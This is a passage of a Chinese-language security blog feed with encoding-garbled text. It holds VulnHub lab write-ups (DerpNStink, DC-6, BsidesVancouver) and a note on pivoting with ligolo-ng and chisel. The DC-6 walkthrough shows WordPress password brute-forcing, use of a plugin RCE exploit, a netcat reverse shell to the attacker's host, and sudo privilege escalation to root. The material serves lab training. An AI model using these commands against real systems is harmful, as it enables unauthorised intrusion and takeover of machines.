src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c0df6fca664071c5aa055.png"><br>æ ¹æ®æç¤ºæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹sudoï¼Œå‘ç°æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€ä¸ªç‰¹å®šç›®å½•ä¸‹çš„ä»»æ„derpyå¼€å¤´çš„å‘½ä»¤ï¼Œé‚£è¿™æ ·æˆ‘ä»¬ç›´æ¥æŠŠbashæ–‡ä»¶å¤åˆ¶ä¸€ä¸ªåˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚ç”±äºè¿™ä¸ªç›®å½•ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸‹ã€‚<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/487151257359e31c45f40.png"><br>æœ€ç»ˆæ‹¿ä¸‹rootæƒé™ã€‚<h1 id="ğŸ“–-æ¨èæ–‡ç« "><a href="#ğŸ“–-æ¨èæ–‡ç« " class="headerlink" title="ğŸ“– æ¨èæ–‡ç« "></a>ğŸ“– æ¨èæ–‡ç« </h1><a href="https://www.vulnhub.com/entry/derpnstink-1,221/">DerpNStinké¶æœºä¸‹è½½åœ°å€</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp DC-6</title>
    <link href="/vulnhub-wp-DC-6/"/>
    <url>/vulnhub-wp-DC-6/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-ä¸»æœºå‘ç°"><a href="#ğŸ–³-ä¸»æœºå‘ç°" class="headerlink" title="ğŸ–³ ä¸»æœºå‘ç°"></a>ğŸ–³ ä¸»æœºå‘ç°</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -i eth0 -r 192.168.1.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                     <br>                                                                                                   <br> 21 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 1260                                 <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.1.1     28:c8:7c:19:bf:e8     13     780  zte corporation                                 <br> 192.168.1.5     20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.1.4     c4:e1:a1:cf:47:95      4     240  GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,L<br> 192.168.1.6     0c:d8:6c:a5:e7:a1      1      60  SHENZHEN FAST TECHNOLOGIES CO.,LTD              <br> 192.168.1.14    08:00:27:e2:b6:88      1      60  PCS Systemtechnik GmbH                          <br> 192.168.1.3     a2:86:90:e6:04:98      1      60  Unknown vendor<br></code></pre></td></tr></table></figure><p>ç›®æ ‡æ˜¯<em>192.168.1.14</em></p><h1 id="ğŸ‘-æœåŠ¡æ‰«æ"><a href="#ğŸ‘-æœåŠ¡æ‰«æ" class="headerlink" title="ğŸ‘ æœåŠ¡æ‰«æ"></a>ğŸ‘ æœåŠ¡æ‰«æ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.94SVN scan initiated Fri Feb 16 15:50:20 2024 as: nmap -p- -oN nmap_scan -sV -sC --min-rate 5000 192.168.1.14</span><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.14 (192.168.1.14)<br>Host is up (0.0016s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)<br>|   256 3c:83:65:71:<span class="hljs-built_in">dd</span>:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)<br>|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-title: Did not follow redirect to http://wordy/<br>|_http-server-header: Apache/2.4.25 (Debian)<br>MAC Address: 08:00:27:E2:B6:88 (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Fri Feb 16 15:50:28 2024 -- 1 IP address (1 host up) scanned in 8.69 seconds</span><br></code></pre></td></tr></table></figure><p>å‘ç°é‡å®šå‘åˆ°*<a href="http://wordy/*%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8A%8A%E5%AE%83%E5%8A%A0%E5%85%A5hosts%E6%96%87%E4%BB%B6%E4%B8%AD">http://wordy/*è¿™ä¸ªç½‘ç«™ï¼Œæˆ‘ä»¬æŠŠå®ƒåŠ å…¥hostsæ–‡ä»¶ä¸­</a><br>å‘ç°ä¸»é¡µæ˜¯ä¸€ä¸ªwordpressç½‘ç«™ï¼Œå¯¹å…¶è¿›è¡Œæ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vt,vp,u --url http://wordy/<br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br></code></pre></td></tr></table></figure><p>å‘ç°äº†å¾ˆå¤šç”¨æˆ·ï¼Œè®°å½•ä¸‹æ¥ï¼Œç„¶åå°è¯•ä¸€ä¸‹ç™»å½•ç•Œé¢çš„å¼±å£ä»¤ï¼Œæ²¡æœ‰è¯•å‡ºå¼±å£ä»¤ï¼Œé‚£å°±å°è¯•çˆ†ç ´ï¼Œå› ä¸ºçˆ†ç ´è·¯å¾„ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ï¼Œé‚£æ”»å‡»å‘é‡åªæœ‰webå–sshï¼Œwebåˆåªæœ‰è¿™ä¸ªç™»å½•é¡µé¢æ˜¯æš´éœ²çš„ã€‚<br>æ ¹æ®ä½œè€…çš„æç¤ºï¼Œç”Ÿæˆä¸€ä¸‹å¯†ç å­—å…¸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt<br></code></pre></td></tr></table></figure><p>å°è¯•çˆ†ç ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy -U <span class="hljs-built_in">users</span> -P passwords.txt<br></code></pre></td></tr></table></figure><p>å¾—åˆ°äº†å‡­è¯ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mark:helpdesk01<br></code></pre></td></tr></table></figure><h1 id="ğŸšªğŸš¶-è·å–æƒé™"><a href="#ğŸšªğŸš¶-è·å–æƒé™" class="headerlink" title="ğŸšªğŸš¶ è·å–æƒé™"></a>ğŸšªğŸš¶ è·å–æƒé™</h1><p>ç™»å½•ä¸Šä¹‹åï¼Œå‘ç°æœ‰ä¸€ä¸ª<em>Activity Monitor</em>ï¼Œæœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰æ¼æ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Activity<br>Â·Â·Â·<br>WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                                                | php/webapps/45274.html<br>WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)                                  | php/webapps/50110.py<br>Â·Â·Â·<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢é‚£ä¸ªï¼Œæ‰§è¡Œä¹‹åè¾“å…¥ipï¼Œusernameï¼Œpasswordï¼Œç„¶åç”¨ncåå¼¹shellã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 192.168.1.13 443<br></code></pre></td></tr></table></figure><h1 id="ğŸ›¡ï¸-æå‡æƒé™"><a href="#ğŸ›¡ï¸-æå‡æƒé™" class="headerlink" title="ğŸ›¡ï¸ æå‡æƒé™"></a>ğŸ›¡ï¸ æå‡æƒé™</h1><p>ç”¨linpeas.shè¾…åŠ©ææƒè„šæœ¬æšä¸¾ä¿¡æ¯<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a54b810a6e27fefc7e8db.png"><br>è¿™é‡Œæœ‰ä¿©ä¸ªæœ‰è¶£çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨things-to-do.txtä¸­å‘ç°ç”¨æˆ·gahamçš„å‡­è¯<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8b10f861a463c18398f89.png"><br>æˆ‘ä»¬ç”¨sshç™»å½•ä¸Šå»ï¼Œåè¿›è¡Œä¸€äº›æšä¸¾ï¼Œå‘ç°å¯ä»¥ä»¥jensèº«ä»½è¿è¡Œbackups.shè„šæœ¬ï¼Œä¸”å› ä¸ºgahamç”¨æˆ·æ˜¯devsç»„ï¼Œå¯¹è¯¥è„šæœ¬æœ‰ä¿®æ”¹æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é‡Œé¢åŠ ä¸€ä¸ª<code>/bin/bash</code>æ¥å¯åŠ¨ä¸€ä¸ªjensç”¨æˆ·çš„shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/706974a57024e476b0702.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u jens ./backups.sh<br></code></pre></td></tr></table></figure><p>æˆ–è€…jensçš„shellåï¼Œå†æ¬¡ä½¿ç”¨<code>sudo -l</code>è¿›è¡Œæ£€æŸ¥<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2f072dfe50fc9ee334d4d.png"><br>ç„¶ååœ¨GTFOBinsæœç´¢nmap<br><a href="https://gtfobins.github.io/gtfobins/nmap/#sudo">https://gtfobins.github.io/gtfobins/nmap/#sudo</a><br>æœ€ç»ˆæ‹¿åˆ°rootçš„shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/644bc544563afde180665.png"></p><h1 id="ğŸ“–-æ¨èæ–‡ç« "><a href="#ğŸ“–-æ¨èæ–‡ç« " class="headerlink" title="ğŸ“– æ¨èæ–‡ç« "></a>ğŸ“– æ¨èæ–‡ç« </h1><p><a href="https://www.vulnhub.com/entry/dc-6,315/">DC-6ä¸‹è½½åœ°å€</a><br><a href="https://www.sevenlayers.com/index.php/194-vulnhub-dc-6-walkthrough">DC-6å›½å¤–å¤§ä½¬walkthroughæ–‡ç« </a><br><a href="https://gtfobins.github.io/">GTFOBinsåœ°å€</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Port redirection &amp;&amp; Tunnel</title>
    <link href="/Port-redirection-Tunnel/"/>
    <url>/Port-redirection-Tunnel/</url>
    
    <content type="html"><![CDATA[<h1 id="ligolo-ng"><a href="#ligolo-ng" class="headerlink" title="ligolo-ng"></a>ligolo-ng</h1><p>åˆå§‹åŒ–æ“ä½œï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> ip </span>tuntap <span class="hljs-built_in">add</span><span class="hljs-built_in"> user </span>/your_username/ mode tun ligolo<br>sudo<span class="hljs-built_in"> ip </span>link <span class="hljs-built_in">set</span> ligolo up<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡ç«¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./proxy -selfcert<br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è¿æ¥ï¼ˆåœ¨å†…ç½‘æœºå™¨ä¸Šæ‰§è¡Œï¼Œè¦æ±‚èƒ½å‡ºç½‘ï¼‰ï¼š<br>windows:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">.\agent.exe -connect <span class="hljs-number">192.168</span><span class="hljs-number">.45</span><span class="hljs-number">.248</span>:<span class="hljs-number">11601</span> -ignore-cert<br></code></pre></td></tr></table></figure><p>linux:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">./agent -connect <span class="hljs-number">192.168</span><span class="hljs-number">.45</span><span class="hljs-number">.153</span>:<span class="hljs-number">11601</span> -ignore-cert<br></code></pre></td></tr></table></figure><p>éšååœ¨æœåŠ¡ç«¯æ·»åŠ ç½‘æ®µï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> ip route </span><span class="hljs-built_in">add</span> 172.16.216.0/24 dev ligolo<br></code></pre></td></tr></table></figure><p>ç„¶åé€‰æ‹©sessionå¹¶å¯åŠ¨éš§é“è¿æ¥<br>sessionå‘½ä»¤é€‰æ‹©sessionï¼Œç„¶åè¾“å…¥startå¯åŠ¨è¿æ¥<br>éšåä¾¿å¯ä»¥ä½¿ç”¨nmapæ‰«æå†…ç½‘ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn <span class="hljs-number">172.16.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®ç›‘å¬å™¨ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">listener_add</span> --addr <span class="hljs-number">0.0.0.0:443</span> --to <span class="hljs-number">127.0.0.1:443</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨æ¥æ¥æ”¶åå¼¹çš„shellå’Œåˆ›å»ºwebæœåŠ¡ä¼ è¾“æ–‡ä»¶ï¼Œä½¿ç”¨listener_listå¯ä»¥æŸ¥çœ‹ç›‘å¬å™¨åˆ—è¡¨</p><h1 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h1><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç‰ˆæœ¬åº”è¯¥ç›¸åŒ<br>å®ƒæ— æ³•åœ¨å†…ç½‘ä¸­ç›‘å¬åå‘shell!!!</p><p>ç”±äºå…¶ç‰¹æ®Šæ€§ï¼Œæœ‰æ—¶ä¸ä¼šè¢«é˜²ç«å¢™ç­‰å‘ç°æˆ–é˜»æ­¢ã€‚<br>ä½†æ˜¯æ‰§è¡Œnmapæ‰«ææ—¶ä¼šèŠ±è´¹æ›´å¤šæ—¶é—´ï¼Œå› ä¸ºsocksä»£ç†åªæ”¯æŒTCPæ‰«æã€‚è€Œchiselæ— æ³•æ¥æ”¶åå‘shellã€‚</p><h2 id="socks-ä»£ç†"><a href="#socks-ä»£ç†" class="headerlink" title="socks ä»£ç†"></a>socks ä»£ç†</h2><p>kali:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel æœåŠ¡å™¨ --port 8080 --reverse<br></code></pre></td></tr></table></figure><p>ç›®æ ‡:<br>åå°è¿è¡Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> &#123; c:\my\chisel.exe å®¢æˆ·ç«¯ <span class="hljs-number">192.168</span>.<span class="hljs-number">45.218</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:socks &#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel å®¢æˆ·ç«¯ 192.168.45.153:8080 R:socks &gt; /dev/null 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>ç›´æ¥è¿è¡Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">c:\my\chisel.exe å®¢æˆ·ç«¯ <span class="hljs-number">192.168</span>.<span class="hljs-number">45.218</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:socks<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel å®¢æˆ·ç«¯ 192.168.45.153:8080 R:socks<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ä»£ç†æ‰§è¡Œå‘½ä»¤ä¸å†…ç½‘é€šä¿¡</p><h2 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h2><p>åå‘æ¨¡å¼ï¼šå°†å®¢æˆ·ç«¯çš„ <code>remote:port</code> å…±äº«ç»™æœåŠ¡å™¨çš„ <code>local:port</code><br>ä¸¥æ ¼æ¨¡å¼ï¼šå°†æœåŠ¡å™¨çš„ <code>remote:port</code> å…±äº«ç»™å®¢æˆ·ç«¯çš„ <code>local:port</code><br>åå‘è¿æ¥æ¯”æ­£å‘è¿æ¥æ›´å¸¸è§ã€‚å› ä¸ºé˜²ç«å¢™ä¼šé˜»æ­¢æˆ‘ä»¬ä¸»åŠ¨è¿æ¥åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel æœåŠ¡å™¨ --port 8080 --reverse<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">chisel.exe æœåŠ¡å™¨ <span class="hljs-literal">--port</span> <span class="hljs-number">8080</span> <span class="hljs-literal">--reverse</span><br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel å®¢æˆ·ç«¯ 192.168.45.153:8080 R:8000:127.0.0.1:8000<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\chisel.exe å®¢æˆ·ç«¯ <span class="hljs-number">192.168</span>.<span class="hljs-number">45.153</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:<span class="hljs-number">8000</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>åå°è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel å®¢æˆ·ç«¯ 192.168.45.220:8080 R:8000:127.0.0.1:8000 &amp;<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> &#123; .\chisel.exe å®¢æˆ·ç«¯ <span class="hljs-number">192.168</span>.<span class="hljs-number">45.153</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:<span class="hljs-number">8000</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span> &#125;<br></code></pre></td></tr></table></figure><p>å¤šä¸ªç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel å®¢æˆ·ç«¯ 192.168.45.153:51234 R:8000:127.0.0.1:8000 R:8443:127.0.01:8443<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># â€œRâ€ æ˜¯ â€œ127.0.0.1â€ çš„ç®€å†™</span><br><span class="hljs-meta"># å®é™…ä¸Šï¼Œåœ¨æ”»å‡»ä¸»æœºä¸Šç›‘å¬ 127.0.0.1</span><br></code></pre></td></tr></table></figure><p>åªéœ€æ·»åŠ  <code>remote_socket</code></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>penetrate</tag>
      
      <tag>tunnel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp BsidesVancouver</title>
    <link href="/vulnhub-wp-BsidesVancouver/"/>
    <url>/vulnhub-wp-BsidesVancouver/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-ä¸»æœºå‘ç°"><a href="#ğŸ–³-ä¸»æœºå‘ç°" class="headerlink" title="ğŸ–³ ä¸»æœºå‘ç°"></a>ğŸ–³ ä¸»æœºå‘ç°</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.233.0/24<br><br> Currently scanning: 192.168.233.0/24   |   Screen View: Unique Hosts                              <br>                                                                                                   <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                   <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.233.114 08:00:27:c5:2c:52      1      60  PCS Systemtechnik GmbH                          <br> 192.168.233.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.233.200 46:8f:d0:01:2f:b1      1      60  Unknown vendor  <br></code></pre></td></tr></table></figure><p>ç›®æ ‡ä¸»æœºæ˜¯ï¼š<strong>192.168.233.114</strong></p><h1 id="ğŸ‘-æœåŠ¡æ‰«æ"><a href="#ğŸ‘-æœåŠ¡æ‰«æ" class="headerlink" title="ğŸ‘ æœåŠ¡æ‰«æ"></a>ğŸ‘ æœåŠ¡æ‰«æ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- 192.168.233.114 --min-rate 8000 -sV -sC<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aa0549ff1aaee561ca781.png"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªbackup_wordpressçš„ç›®å½•ï¼Œåº”è¯¥æå¤§å¯èƒ½æ˜¯ä¸€ä¸ªwordpressï¼Œåœ¨æµè§ˆå™¨è®¿é—®è¿‡åä¹Ÿè¯å®äº†è¿™ä¸ª<br>(ftpæœ‰ä¸”åªæœ‰åŒ¿åç™»å½•ï¼Œç„¶åæœ‰ä¸€ä¸ªç”¨æˆ·åˆ—è¡¨æ–‡ä»¶ï¼Œä½†æ˜¯sshçˆ†ç ´æ°¸è¿œæ˜¯æœ€åä¸€æ¡è·¯)<br>æˆ‘ä»¬ä¸Šwordpressçš„ä¸“ä¸šå·¥å…·wpscan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vp,vt,u --url http://192.168.233.114/backup_wordpress/<br></code></pre></td></tr></table></figure><ul><li><code>-e</code> è¿›è¡Œæšä¸¾ï¼Œ<code>vp</code>,æ¼æ´æ’ä»¶æšä¸¾,<code>vt</code>,æ¼æ´ä¸»é¢˜æšä¸¾,<code>u</code>ï¼Œç”¨æˆ·æšä¸¾</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs 